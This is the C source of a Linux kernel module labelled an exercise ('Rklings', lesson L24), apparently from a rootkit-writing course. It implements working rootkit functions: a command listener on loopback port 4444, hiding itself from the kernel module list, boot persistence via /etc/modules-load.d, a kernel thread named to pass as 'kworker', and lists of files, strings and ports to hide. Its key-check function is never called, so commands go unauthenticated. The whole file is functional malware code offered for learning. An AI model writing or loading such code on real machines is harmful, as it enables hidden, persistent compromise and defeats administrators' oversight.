// SPDX-License-Identifier: GPL-2.0
#include <crypto/hash.h>
#include <linux/init.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/string.h>
#include <linux/umh.h>
#include <linux/utsname.h>
#include <net/net_namespace.h>

#define RK_KEY_LEN	32
#define RK_KEY_HEX_LEN	64
#define RK_FP_LEN	4
#define RK_PORT		4444
#define RK_BUF_MAX	512
#define RK_MAX_TARGETS	16
#define RK_TARGET_LEN	64

static char *control_key;
module_param(control_key, charp, 0);

static u8 rk_key[RK_KEY_LEN];
static u8 rk_fingerprint[RK_FP_LEN];

/* Hidden target arrays */
static char hidden_files[RK_MAX_TARGETS][RK_TARGET_LEN];
static int file_count;

static char hidden_contents[RK_MAX_TARGETS][RK_TARGET_LEN];
static int content_count;

static unsigned short hidden_ports[RK_MAX_TARGETS];
static int port_count;

/* Module hiding state */
static struct list_head *saved_prev;
static bool module_hidden;

static struct task_struct *rk_thread;
static struct socket *rk_listen_sock;

/* ---- crypto helpers ---------------------------------------------------- */

static int rk_compute_fingerprint(const u8 *key, size_t key_len,
				  u8 *fp, size_t fp_len)
{
	struct crypto_shash *tfm;
	struct shash_desc *desc;
	u8 digest[32];
	int error;

	tfm = crypto_alloc_shash("sha256", 0, 0);
	if (IS_ERR(tfm))
		return PTR_ERR(tfm);

	desc = kzalloc(sizeof(*desc) + crypto_shash_descsize(tfm), GFP_KERNEL);
	if (!desc) {
		crypto_free_shash(tfm);
		return -ENOMEM;
	}

	desc->tfm = tfm;
	error = crypto_shash_digest(desc, key, key_len, digest);
	if (!error)
		memcpy(fp, digest, fp_len);

	memzero_explicit(digest, sizeof(digest));
	kfree(desc);
	crypto_free_shash(tfm);
	return error;
}

bool rk_key_verify(const u8 *incoming, size_t len)
{
	if (!incoming || len != RK_FP_LEN)
		return false;
	return memcmp(incoming, rk_fingerprint, RK_FP_LEN) == 0;
}

/* ---- socket helpers ---------------------------------------------------- */

static int rk_send(struct socket *sock, const void *buf, size_t len)
{
	struct msghdr msg = { 0 };
	struct kvec vec = { .iov_base = (void *)buf, .iov_len = len };

	return kernel_sendmsg(sock, &msg, &vec, 1, len);
}

static int rk_recv(struct socket *sock, void *buf, size_t len)
{
	struct msghdr msg = { 0 };
	struct kvec vec = { .iov_base = buf, .iov_len = len };

	return kernel_recvmsg(sock, &msg, &vec, 1, len, 0);
}

/* ---- management commands (from L23) ------------------------------------ */

static int rk_cmd_info(struct socket *client)
{
	struct new_utsname *uts = utsname();
	char buf[RK_BUF_MAX];
	int n;

	n = snprintf(buf, sizeof(buf),
		     "nodename: %s\nrelease: %s\nmachine: %s\n",
		     uts->nodename, uts->release, uts->machine);
	return rk_send(client, buf, n);
}

static int rk_cmd_list(struct socket *client, const char *category)
{
	char buf[RK_BUF_MAX];
	int n, i;

	if (strcmp(category, "FILE") == 0) {
		if (file_count == 0)
			return rk_send(client, "empty\n", 6);
		for (i = 0; i < file_count; i++) {
			n = snprintf(buf, sizeof(buf), "[%d] %s\n",
				     i, hidden_files[i]);
			rk_send(client, buf, n);
		}
	} else if (strcmp(category, "CONTENT") == 0) {
		if (content_count == 0)
			return rk_send(client, "empty\n", 6);
		for (i = 0; i < content_count; i++) {
			n = snprintf(buf, sizeof(buf), "[%d] %s\n",
				     i, hidden_contents[i]);
			rk_send(client, buf, n);
		}
	} else if (strcmp(category, "PORT") == 0) {
		if (port_count == 0)
			return rk_send(client, "empty\n", 6);
		for (i = 0; i < port_count; i++) {
			n = snprintf(buf, sizeof(buf), "[%d] %u\n",
				     i, hidden_ports[i]);
			rk_send(client, buf, n);
		}
	} else {
		return rk_send(client, "unknown category\n", 17);
	}

	return 0;
}

static int rk_cmd_unhide_all(struct socket *client)
{
	file_count = 0;
	content_count = 0;
	port_count = 0;
	return rk_send(client, "cleared\n", 8);
}

/* ---- hide commands (new in L24) ---------------------------------------- */

static int rk_cmd_hide_file(struct socket *client, const char *name)
{
	if (file_count >= RK_MAX_TARGETS)
		return rk_send(client, "full\n", 5);
	if (strlen(name) >= RK_TARGET_LEN)
		return rk_send(client, "too long\n", 9);

	strscpy(hidden_files[file_count], name, RK_TARGET_LEN);
	file_count++;
	return rk_send(client, "hidden\n", 7);
}

static int rk_cmd_hide_content(struct socket *client, const char *str)
{
	if (content_count >= RK_MAX_TARGETS)
		return rk_send(client, "full\n", 5);
	if (strlen(str) >= RK_TARGET_LEN)
		return rk_send(client, "too long\n", 9);

	strscpy(hidden_contents[content_count], str, RK_TARGET_LEN);
	content_count++;
	return rk_send(client, "hidden\n", 7);
}

static int rk_cmd_hide_port(struct socket *client, const char *arg)
{
	unsigned short port;

	if (port_count >= RK_MAX_TARGETS)
		return rk_send(client, "full\n", 5);
	if (kstrtou16(arg, 10, &port) || port == 0)
		return rk_send(client, "invalid port\n", 13);

	hidden_ports[port_count] = port;
	port_count++;
	return rk_send(client, "hidden\n", 7);
}

/* ---- module visibility ------------------------------------------------- */

static int rk_cmd_hide_module(struct socket *client)
{
	if (module_hidden)
		return rk_send(client, "already hidden\n", 15);

	saved_prev = THIS_MODULE->list.prev;
	list_del_init(&THIS_MODULE->list);
	module_hidden = true;
	return rk_send(client, "module hidden\n", 14);
}

static int rk_cmd_unhide_module(struct socket *client)
{
	if (!module_hidden)
		return rk_send(client, "already visible\n", 16);

	list_add(&THIS_MODULE->list, saved_prev);
	module_hidden = false;
	return rk_send(client, "module visible\n", 15);
}

/* ---- boot persistence -------------------------------------------------- */

static int rk_cmd_persist(struct socket *client)
{
	char *argv[] = { "/bin/sh", "-c",
		"echo rklings > /etc/modules-load.d/rklings.conf", NULL };
	char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	int error;

	error = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	if (error)
		return rk_send(client, "persist failed\n", 15);
	return rk_send(client, "persisted\n", 10);
}

static int rk_cmd_unpersist(struct socket *client)
{
	char *argv[] = { "/bin/sh", "-c",
		"rm -f /etc/modules-load.d/rklings.conf", NULL };
	char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	int error;

	error = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	if (error)
		return rk_send(client, "unpersist failed\n", 17);
	return rk_send(client, "unpersisted\n", 12);
}

/* ---- command dispatch -------------------------------------------------- */

static int rk_dispatch(struct socket *client, char *cmd)
{
	size_t len = strlen(cmd);

	if (len > 0 && cmd[len - 1] == '\n')
		cmd[len - 1] = '\0';

	if (strcmp(cmd, "INFO") == 0)
		return rk_cmd_info(client);
	if (strncmp(cmd, "LIST ", 5) == 0)
		return rk_cmd_list(client, cmd + 5);
	if (strcmp(cmd, "UNHIDE ALL") == 0)
		return rk_cmd_unhide_all(client);
	if (strncmp(cmd, "HIDE FILE ", 10) == 0)
		return rk_cmd_hide_file(client, cmd + 10);
	if (strncmp(cmd, "HIDE CONTENT ", 13) == 0)
		return rk_cmd_hide_content(client, cmd + 13);
	if (strncmp(cmd, "HIDE PORT ", 10) == 0)
		return rk_cmd_hide_port(client, cmd + 10);
	if (strcmp(cmd, "HIDE MODULE") == 0)
		return rk_cmd_hide_module(client);
	if (strcmp(cmd, "UNHIDE MODULE") == 0)
		return rk_cmd_unhide_module(client);
	if (strcmp(cmd, "PERSIST") == 0)
		return rk_cmd_persist(client);
	if (strcmp(cmd, "UNPERSIST") == 0)
		return rk_cmd_unpersist(client);

	return rk_send(client, "unknown command\n", 16);
}

/* ---- client handler and agent thread ----------------------------------- */

static void rk_handle_client(struct socket *client)
{
	char buf[RK_BUF_MAX];
	int n;

	while (!kthread_should_stop()) {
		memset(buf, 0, sizeof(buf));
		n = rk_recv(client, buf, sizeof(buf) - 1);
		if (n <= 0)
			break;
		buf[n] = '\0';
		rk_dispatch(client, buf);
	}
}

static int rk_agent_thread(void *data)
{
	struct socket *client = NULL;
	int error;

	while (!kthread_should_stop()) {
		error = kernel_accept(rk_listen_sock, &client, 0);
		if (error < 0)
			break;
		rk_handle_client(client);
		sock_release(client);
		client = NULL;
	}
	return 0;
}

/* ---- module lifecycle -------------------------------------------------- */

static int __init rk_init(void)
{
	struct sockaddr_in addr;
	u32 fp_val;
	int error;

	if (!control_key)
		return -EINVAL;
	if (strlen(control_key) != RK_KEY_HEX_LEN)
		return -EINVAL;
	if (hex2bin(rk_key, control_key, RK_KEY_LEN) < 0)
		return -EINVAL;

	memzero_explicit(control_key, RK_KEY_HEX_LEN);

	error = rk_compute_fingerprint(rk_key, RK_KEY_LEN,
				       rk_fingerprint, RK_FP_LEN);
	if (error)
		goto fail_key;

	fp_val = (rk_fingerprint[0] << 24) | (rk_fingerprint[1] << 16) |
		 (rk_fingerprint[2] << 8)  |  rk_fingerprint[3];
	pr_info("rklings: key loaded, fingerprint %08x\n", fp_val);

	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
				 IPPROTO_TCP, &rk_listen_sock);
	if (error)
		goto fail_key;

	sock_set_reuseaddr(rk_listen_sock->sk);

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	addr.sin_port = htons(RK_PORT);

	error = kernel_bind(rk_listen_sock, (struct sockaddr *)&addr,
			    sizeof(addr));
	if (error)
		goto fail_sock;

	error = kernel_listen(rk_listen_sock, 1);
	if (error)
		goto fail_sock;

	rk_thread = kthread_run(rk_agent_thread, NULL, "kworker/u8:3");
	if (IS_ERR(rk_thread)) {
		error = PTR_ERR(rk_thread);
		rk_thread = NULL;
		goto fail_sock;
	}

	return 0;

fail_sock:
	sock_release(rk_listen_sock);
	rk_listen_sock = NULL;
fail_key:
	memzero_explicit(rk_key, sizeof(rk_key));
	return error;
}

static void __exit rk_exit(void)
{
	/* Restore module visibility before teardown */
	if (module_hidden) {
		list_add(&THIS_MODULE->list, saved_prev);
		module_hidden = false;
	}

	if (rk_thread)
		kthread_stop(rk_thread);
	if (rk_listen_sock) {
		kernel_sock_shutdown(rk_listen_sock, SHUT_RDWR);
		sock_release(rk_listen_sock);
	}
	memzero_explicit(rk_key, sizeof(rk_key));
	memzero_explicit(rk_fingerprint, sizeof(rk_fingerprint));
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings exercise module");
